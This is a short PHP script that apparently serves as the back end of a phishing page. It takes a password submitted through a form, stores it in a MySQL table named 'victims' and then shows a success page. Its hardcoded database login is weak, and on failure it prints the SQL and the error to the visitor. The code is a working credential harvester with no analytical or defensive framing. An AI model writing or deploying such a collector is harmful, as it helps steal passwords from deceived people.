<?php
$servername = "localhost";
$username = "newuser";
$password = "password";
$dbname = "check";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
$pass = mysqli_real_escape_string($conn, $_POST['password']);
$sql = "INSERT INTO victims (password)
VALUES ('" . $pass . "')";

if ($conn->query($sql) === TRUE) {
    echo file_get_contents('success.html');
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

$conn->close();
?>